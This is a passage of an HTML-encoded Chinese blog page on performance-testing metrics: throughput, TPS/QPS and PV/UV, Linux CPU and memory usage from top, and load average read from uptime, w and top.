href="#1-4-&#x541E;&#x5410;&#x91CF;-&#x541E;&#x5410;&#x7387;" class="headerlink" title="1.4 &#x541E;&#x5410;&#x91CF;/&#x541E;&#x5410;&#x7387;"></a>1.4 &#x541E;&#x5410;&#x91CF;/&#x541E;&#x5410;&#x7387;</h3><p>&#x541E;&#x5410;&#x91CF;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x7F51;&#x7EDC;&#x4E0A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x4E1A;&#x52A1;&#x4E2D;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x6570;&#x636E;&#x91CF;&#x7684;&#x603B;&#x548C;&#x3002;</p><p>&#x541E;&#x5410;&#x7387;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7684;&#x541E;&#x5410;&#x91CF;&#x3002;&#x53EF;&#x4EE5;&#x4ECE;&#x591A;&#x4E2A;&#x7EF4;&#x5EA6;&#x8861;&#x91CF;&#x541E;&#x5410;&#x7387;&#xFF1A;&#x2460;&#x4E1A;&#x52A1;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x6216;&#x9875;&#x9762;&#x6570;&#xFF0C;&#x5373;&#x8BF7;&#x6C42;&#x6570;/&#x79D2;&#x6216;&#x9875;&#x9762;&#x6570;/&#x79D2;&#xFF1B;&#x2461;&#x7F51;&#x7EDC;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7F51;&#x7EDC;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&#xFF0C;&#x5373;&#x5B57;&#x8282;&#x6570;/&#x79D2;&#x7B49;&#xFF1B;&#x2462;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;&#x6240;&#x627F;&#x53D7;&#x7684;&#x538B;&#x529B;&#xFF0C;&#x5373;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#x3002;</p><p>&#x541E;&#x5410;&#x7387;&#xFF08;&#x6216;&#x541E;&#x5410;&#x91CF;&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x591A;&#x7EF4;&#x5EA6;&#x91CF;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4E0E;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x6240;&#x6D88;&#x8017;&#x7684;CPU&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x548C;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;&#x90FD;&#x5F3A;&#x76F8;&#x5173;&#x3002;</p><h3 id="1-5-TPS-QPS"><a href="#1-5-TPS-QPS" class="headerlink" title="1.5 TPS/QPS"></a>1.5 TPS/QPS</h3><p>TPS&#xFF08;Transaction Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x7684;&#x4E8B;&#x52A1;&#x91CF;&#x3002;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6216;&#x8005;&#x52A8;&#x4F5C;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6BD4;&#x5982;&#x201C;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x201C;&#x4E8B;&#x52A1;&#x662F;&#x70B9;&#x51FB;&#x6CE8;&#x518C;&#x6309;&#x94AE;&#xFF0C;&#x586B;&#x5199;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x4FE1;&#x606F;&#xFF0C;&#x70B9;&#x51FB;&#x63D0;&#x4EA4;&#x6309;&#x94AE;&#xFF0C;&#x4EE5;&#x53CA;&#x52A0;&#x8F7D;&#x6CE8;&#x518C;&#x6210;&#x529F;&#x9875;&#x9762;&#x7684;&#x52A8;&#x4F5C;&#x96C6;&#x5408;&#x3002;</p><p>QPS&#xFF08;Query Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6B21;&#x6570;&#x3002;</p><p>TPS&#x548C;QPS&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5F53;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x76F8;&#x5F53;&#x4E8E;&#x591A;&#x4E2A;QPS&#xFF1B;&#x5F53;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x5219;&#x7B49;&#x4EF7;&#x4E8E;&#x4E00;&#x4E2A;QPS&#x3002;</p><h3 id="1-6-PV-UV"><a href="#1-6-PV-UV" class="headerlink" title="1.6 PV/UV"></a>1.6 PV/UV</h3><p>PV&#x548C;UV&#x662F;&#x8861;&#x91CF;web&#x7F51;&#x7AD9;&#x6027;&#x80FD;&#x5BB9;&#x91CF;&#x7684;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x5728;&#x7535;&#x5B50;&#x5546;&#x52A1;&#x7F51;&#x7AD9;&#x9886;&#x57DF;&#x4E2D;&#x7528;&#x6765;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x7684;&#x6D3B;&#x8DC3;&#x5EA6;&#x3002;</p><p>PV&#xFF08;Page View&#xFF09;&#x662F;&#x9875;&#x9762;&#x7684;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x7528;&#x6237;&#x5BF9;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x4EFB;&#x4F55;&#x9875;&#x9762;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x70B9;&#x51FB;&#x6216;&#x8005;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x5BF9;&#x76F8;&#x540C;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x8BBF;&#x95EE;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#x4E5F;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002;</p><p>UV&#xFF08;Unique Vistor&#xFF09;&#x662F;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x7684;&#x72EC;&#x7ACB;&#x8BBF;&#x5BA2;&#xFF0C;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x76F8;&#x540C;&#x5BA2;&#x6237;&#x7AEF;&#xFF08;&#x6216;PC&#xFF09;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x53EA;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#xFF0C;&#x8FDE;&#x7EED;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x6216;&#x8005;&#x6D4F;&#x89C8;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x9875;&#x9762;&#x6B21;&#x6570;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002;</p><p>PV&#x548C;UV&#x6309;&#x7167;&#x7EDF;&#x8BA1;&#x5468;&#x671F;&#x5212;&#x5206;&#xFF0C;&#x53EF;&#x4EE5;&#x5212;&#x5206;&#x4E3A;&#x5168;&#x5929;PV&#x3001;&#x6BCF;&#x5C0F;&#x65F6;PV&#x3001;&#x5168;&#x5929;UV&#x548C;&#x6BCF;&#x5C0F;&#x65F6;UV&#x7B49;&#x3002;&#x5728;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x6216;&#x4EA4;&#x6613;&#x91CF;&#x975E;&#x5E38;&#x5E9E;&#x5927;&#x7684;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982;&#x53CC;11&#x6216;618&#x7B49;&#x5168;&#x6C11;&#x8D2D;&#x7269;&#x6D3B;&#x52A8;&#x65F6;&#xFF0C;&#x5E38;&#x5E38;&#x8FD8;&#x4F1A;&#x7EDF;&#x8BA1;&#x5CF0;&#x503C;PV&#x548C;&#x5CF0;&#x503C;UV&#x3002;</p><h2 id="Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;"><a href="#Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;" class="headerlink" title="Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;"></a>Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;</h2><h3 id="2-1-CPU&#x4F7F;&#x7528;&#x7387;"><a href="#2-1-CPU&#x4F7F;&#x7528;&#x7387;" class="headerlink" title="2.1 CPU&#x4F7F;&#x7528;&#x7387;"></a>2.1 CPU&#x4F7F;&#x7528;&#x7387;</h3><p>CPU&#x4F7F;&#x7528;&#x7387;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;CPU&#x7684;&#x4F7F;&#x7528;&#x7EDF;&#x8BA1;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x9664;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x5916;&#x5176;&#x4ED6;&#x65F6;&#x95F4;&#x5360;&#x603B;CPU&#x65F6;&#x95F4;&#x7684;&#x767E;&#x5206;&#x6BD4;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5373;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;=1-CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;/&#x603B;CPU&#x65F6;&#x95F4;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top ## top&#x547D;&#x4EE4;&#x95F4;&#x9694;3s&#x4F1A;&#x52A8;&#x6001;&#x6EDA;&#x52A8;&#x66F4;&#x65B0;&#x4E00;&#x6B21;&#x6570;&#x636E;</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923805160103382topcmd.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A;</p><p>us (user)&#xFF1A;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x771F;&#x6B63;&#x65F6;&#x95F4;&#xFF0C;&#x5B83;&#x4E0D;&#x5305;&#x62EC;&#x540E;&#x9762;&#x7684;ni&#x65F6;&#x95F4;&#xFF1B;</p><p>sy (system): &#x5185;&#x6838;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x5F80;&#x5F80;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001;&#xFF1B;</p><p>ni (nice): &#x8868;&#x793A;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E3A;[-20,19]&#xFF0C;&#x6570;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x8D8A;&#x4F4E;&#xFF1B;</p><p>id (idle): &#x8868;&#x793A;&#x7A7A;&#x95F2;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x503C;&#x8D8A;&#x5927;&#xFF0C;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x8D8A;&#x9AD8;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x8D8A;&#x4F4E;&#xFF1B;</p><p>wa (iowait): &#x8868;&#x793A;&#x5904;&#x4E8E;IO&#x7B49;&#x5F85;&#x72B6;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>hi (hard interrupt): &#x8868;&#x793A;&#x5904;&#x7406;&#x786C;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>si (soft interrupt): &#x4E0E;hi&#x76F8;&#x53CD;&#xFF0C;&#x8868;&#x793A;&#x5904;&#x7406;&#x8F6F;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>st (steal): &#x8868;&#x793A;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x5728;&#x865A;&#x62DF;&#x673A;&#x4E2D;&#x88AB;&#x5176;&#x4ED6;&#x865A;&#x62DF;&#x673A;&#x5360;&#x7528;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x53EF;&#x4EE5;&#x7528;&#xFF08;1-id&#xFF09;&#x6765;&#x8BA1;&#x7B97;&#x3002;&#x5F53;us&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x4F18;&#x5316;&#x6027;&#x80FD;&#xFF1B;&#x5F53;sy&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x5185;&#x6838;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x662F;&#x5426;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x9891;&#x7E41;&#x3001;CPU&#x8FDB;&#x7A0B;&#x6216;&#x7EBF;&#x7A0B;&#x5207;&#x6362;&#x9891;&#x7E41;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x6027;&#x80FD;&#x7684;&#x4F18;&#x5316;&#xFF1B;&#x5F53;wa&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x8FDB;&#x7A0B;&#x5728;&#x8FDB;&#x884C;&#x9891;&#x7E41;&#x7684;IO&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x78C1;&#x76D8;IO&#x6216;&#x8005;&#x7F51;&#x7EDC;IO&#x3002;</p><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;%us+%sy&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002;</p><h3 id="2-2-&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;"><a href="#2-2-&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;" class="headerlink" title="2.2 &#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;"></a>2.2 &#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;</h3><p>Linux&#x7684;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x9075;&#x5FAA;&#x5185;&#x5B58;&#x5229;&#x7528;&#x7387;&#x6700;&#x5927;&#x5316;&#x7684;&#x539F;&#x5219;&#x3002;&#x5185;&#x6838;&#x4F1A;&#x5C06;&#x7A7A;&#x4F59;&#x7684;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;cached&#xFF08;&#x4E0D;&#x5C5E;&#x4E8E;free&#xFF09;&#xFF0C;&#x5BF9;&#x4E8E;&#x6709;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x4FDD;&#x5B58;&#x5728;cached&#x4E2D;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;&#x4E8E;linux&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x4E0D;&#x6B62;free&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x5305;&#x62EC;cached&#x7684;&#x5185;&#x5B58;&#xFF08;&#x5176;&#x5B9E;&#x8FD8;&#x5305;&#x62EC;buffers&#x7684;&#x5185;&#x5B58;&#xFF09;&#x3002;</p><p>cached&#x548C;buffers&#x90FD;&#x5C5E;&#x4E8E;&#x7F13;&#x5B58;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x533A;&#x522B;&#x4E3B;&#x8981;&#x5728;&#x4E8E;cached&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7F13;&#x51B2;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BB0;&#x5FC6;&#x6211;&#x4EEC;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1B;&#x800C;buffers&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x505A;&#x7684;&#x7F13;&#x51B2;&#x5927;&#x5C0F;&#xFF0C;&#x53EA;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;metadata&#x4EE5;&#x53CA;tracking in-flight pages&#x4FE1;&#x606F;&#xFF0C;&#x6BD4;&#x5982;&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6743;&#x9650;&#x7B49;&#x3002;</p><p>top&#x5DE5;&#x5177;&#x65E2;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;CPU&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x4FE1;&#x606F;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923863850081274topmemory.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7ECF;&#x5E38;&#x4F1A;&#x7528;&#x5230;&#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x4EE5;&#x53CA;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x8FD9;&#x51E0;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x8BA1;&#x7B97;&#x516C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;MemUsed=MemTotal-MemFree           //&#x5305;&#x542B;buffers&#x548C;cached</p><p>&#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;-/+Used= MemTotal-MemFree-MemBuffers-MemCached</p><p>&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;MemUsed%=&#xFF08;MemUsed/ MemTotal&#xFF09;*100%</p><p>&#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;-/+Used%=(-/+Used/ MemTotal&#xFF09;*100%</p><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x826F;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x8D85;&#x51FA;&#x5219;&#x8BF4;&#x660E;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7D27;&#x5F20;&#x3002;</p><h3 id="2-3-&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;"><a href="#2-3-&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;" class="headerlink" title="2.3 &#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;"></a>2.3 &#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;</h3><p>&#x5F53;&#x53D1;&#x73B0;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x5361;&#x65AD;&#x6216;&#x8005;&#x8FD0;&#x884C;&#x4E0D;&#x987A;&#x7545;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;uptime&#xFF0C;top&#x6216;&#x8005;w&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002;</p><pre><code>uptime</code></pre><p><code>uptime</code>command<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923897275247246uptime_loadaverage.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p><code>w</code>command<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923915145507123w_loadaverage.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p><code>top</code>command<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923943410185712top_loadaverage.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>Linux&#x7684;load average&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x7684;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x663E;&#x793A;&#x7684;&#x4E09;&#x4E2A;&#x6570;&#x503C;&#x5206;&#x522B;&#x8868;&#x793A;1&#x5206;&#x949F;&#x3001;5&#x5206;&#x949F;&#x548C;15&#x5206;&#x949F;&#x5185;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x548C;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x5E73;&#x5747;&#x8FDB;&#x7A0B;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x7406;&#x89E3;&#x4E3A;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x6D3B;&#x8DC3;&#x8FDB;&#x7A0B;&#x6570;&#x3002;&#x5176;&#x4E2D;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x662F;&#x6307;&#x6B63;&#x5728;&#x4F7F;&#x7528;CPU&#x6216;&#x8005;&#x6B63;&#x5728;&#x7B49;&#x5F85;CPU&#x7684;&#x8FDB;&#x7A0B;&#xFF08;&#x5904;&#x4E8E;R&#x72B6;&#x6001;&#xFF1A;Running&#x6216;&#x8005;Runnable&#x7684;&#x8FDB;&#x7A0B;&#xFF09;&#xFF1B;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x8FDB;&#x7A0B;&#x6307;&#x7684;&#x662F;&#x6B63;&#x5904;&#x4E8E;&#x5185;&#x6838;&#x6001;&#x5173;&#x952E;&#x6D41;&#x7A0B;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#xFF0C;&#x5904;&#x4E8E;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B;&#x662F;&#x4E0D;&#x53EF;&#x6253;&#x65AD;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x7B49;&#x5F85;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x7684;I/O&#x54CD;&#x5E94;&#x3002;</p><p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5F53;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x4E3A;4&#xFF1A;</p><p>&#x5BF9;&#x4E8E;&#x53EA;&#x6709;1&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x5E73;&#x5747;&#x6709;3&#x4E2A;&#x8FDB;&#x7A0B;&#x7ADE;&#x4E89;&#x4E0D;&#x5230;CPU&#xFF1B;</p><p>&#x5BF9;&#x4E8E;&#x62E5;&#x6709;4&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;100%&#xFF1B;</p><p>&#x5BF9;&#x4E8E;&#x62E5;&#x6709;8&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;50%&#xFF0C;&#x6709;&#x4E00;&#x534A;&#x7A7A;&#x95F2;&#x3002;</p><p>&#x53EF;